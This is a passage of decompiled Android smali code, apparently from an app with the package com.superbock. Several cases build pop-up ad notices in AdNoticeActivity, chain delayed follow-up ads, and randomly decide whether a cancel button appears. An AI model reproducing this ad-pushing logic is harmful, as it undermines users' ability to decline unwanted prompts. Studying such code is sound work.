    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v14}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    const-string v6, "0,0,255"

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    const/4 v6, 0x1

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setAlign(I)V

    new-instance v7, Ljava/util/Random;

    invoke-direct {v7}, Ljava/util/Random;-><init>()V

    const/4 v8, 0x2

    invoke-virtual {v7, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v7

    if-ne v7, v6, :cond_2a

    const v6, 0x7f0f0001

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_2a
    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    invoke-virtual {v2, v10, v11}, Lcom/superbock/bean/AdInfo;->setAiLinkDelayMillis(J)V

    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v6

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const/4 v6, 0x2

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x3

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    const/4 v6, 0x1

    if-lt v5, v6, :cond_2b

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_2b
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdNoticeActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_14
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/16 v6, 0x14

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    add-int/2addr v5, v6

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setAutoClose(I)V

    const/16 v5, 0x3ec

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v9}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_2c

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    move-object/from16 v5, v19

    goto :goto_11

    :cond_2c
    move-object/from16 v5, v19

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_11
    const/4 v6, 0x1

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v6, 0x7f0f00be

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v7

    invoke-static {v3, v7}, Lk3/e;->d(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setLink(Ljava/lang/String;)V

    new-instance v1, Lcom/superbock/bean/AdInfo;

    invoke-direct {v1}, Lcom/superbock/bean/AdInfo;-><init>()V

    const/4 v7, 0x2

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    if-eqz v0, :cond_2d

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    goto :goto_12

    :cond_2d
    invoke-virtual {v1, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_12
    const/4 v0, 0x7

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f00bb

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f001f

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v13}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    invoke-virtual {v2, v10, v11}, Lcom/superbock/bean/AdInfo;->setAiLinkDelayMillis(J)V

    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v5, 0x3ec

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x3

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    const/4 v6, 0x1

    if-lt v5, v6, :cond_2e

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_2e
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdNoticeActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_15
    const/4 v2, 0x2

    invoke-static {v2}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v5

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/4 v6, 0x1

    invoke-virtual {v5, v6}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    new-instance v6, Ljava/util/Random;

    invoke-direct {v6}, Ljava/util/Random;-><init>()V

    const/16 v7, 0x14

    invoke-virtual {v6, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v6

    add-int/2addr v6, v7

    invoke-virtual {v5, v6}, Lcom/superbock/bean/AdInfo;->setAutoClose(I)V

    const/16 v6, 0x3eb

    invoke-virtual {v5, v6}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    move-object/from16 v6, v20

    invoke-virtual {v5, v6}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v5, v2}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v5}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_2f

    invoke-virtual {v5, v2}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    move-object/from16 v6, v18

    goto :goto_13

    :cond_2f
    move-object/from16 v6, v18

    invoke-virtual {v5, v6}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_13
    const/4 v7, 0x1

    invoke-virtual {v5, v7}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v7, 0x7f0f008a

    invoke-virtual {v3, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v8}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v5}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v8

    invoke-static {v3, v8}, Lk3/e;->d(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v8}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v5, v1}, Lcom/superbock/bean/AdInfo;->setLink(Ljava/lang/String;)V

    new-instance v1, Lcom/superbock/bean/AdInfo;

    invoke-direct {v1}, Lcom/superbock/bean/AdInfo;-><init>()V

    const/4 v8, 0x2

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v5}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v9

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v5}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v5}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    if-eqz v2, :cond_30

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    goto :goto_14

    :cond_30
    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_14
    const/16 v2, 0x8

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v3, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v2, 0x7f0f0086

    invoke-virtual {v3, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v2, 0x7f0f0010

    invoke-virtual {v3, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v14}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    invoke-virtual {v1, v13}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setAlign(I)V

    new-instance v6, Ljava/util/Random;

    invoke-direct {v6}, Ljava/util/Random;-><init>()V

    const/4 v7, 0x2

    invoke-virtual {v6, v7}, Ljava/util/Random;->nextInt(I)I

    move-result v6

    if-ne v6, v2, :cond_31

    const v2, 0x7f0f0001

    invoke-virtual {v3, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_31
    invoke-virtual {v5, v1}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    invoke-virtual {v5, v10, v11}, Lcom/superbock/bean/AdInfo;->setAiLinkDelayMillis(J)V

    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v2, 0x3eb

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x3

    invoke-virtual {v2, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    const/4 v6, 0x1

    if-lt v2, v6, :cond_32

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_32
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdNoticeActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_16
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/16 v6, 0x14

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    add-int/2addr v5, v6

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setAutoClose(I)V

    const/16 v5, 0x3ea

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_33

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    move-object/from16 v5, v17

    goto :goto_15

    :cond_33
    move-object/from16 v5, v17

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_15
    const/4 v6, 0x1

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v6, 0x7f0f00fd

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v7

    invoke-static {v3, v7}, Lk3/e;->d(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setLink(Ljava/lang/String;)V

    new-instance v1, Lcom/superbock/bean/AdInfo;

    invoke-direct {v1}, Lcom/superbock/bean/AdInfo;-><init>()V

    const/4 v7, 0x2

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v8}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    if-eqz v0, :cond_34

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    goto :goto_16

    :cond_34
    invoke-virtual {v1, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_16
    const/4 v0, 0x7

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f0101

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0003

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v15}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v5, 0x1

    if-ne v0, v5, :cond_35

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    :cond_35
    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    invoke-virtual {v2, v10, v11}, Lcom/superbock/bean/AdInfo;->setAiLinkDelayMillis(J)V

    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const/4 v5, 0x2

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v5, 0x3ea

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x3

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    const/4 v6, 0x1

    if-lt v5, v6, :cond_36

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_36
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdNoticeActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_17
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/4 v7, 0x1

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    new-instance v7, Ljava/util/Random;

    invoke-direct {v7}, Ljava/util/Random;-><init>()V

    const/16 v8, 0x14

    invoke-virtual {v7, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v7

    add-int/2addr v7, v8

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setAutoClose(I)V

    const/16 v7, 0x3e9

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_37

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    move-object/from16 v5, v16

    goto :goto_17

    :cond_37
    move-object/from16 v5, v16

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_17
    const/4 v7, 0x1

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v7, 0x7f0f010f

    invoke-virtual {v3, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v7

    invoke-static {v3, v7}, Lk3/e;->d(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    new-instance v7, Ljava/lang/StringBuilder;

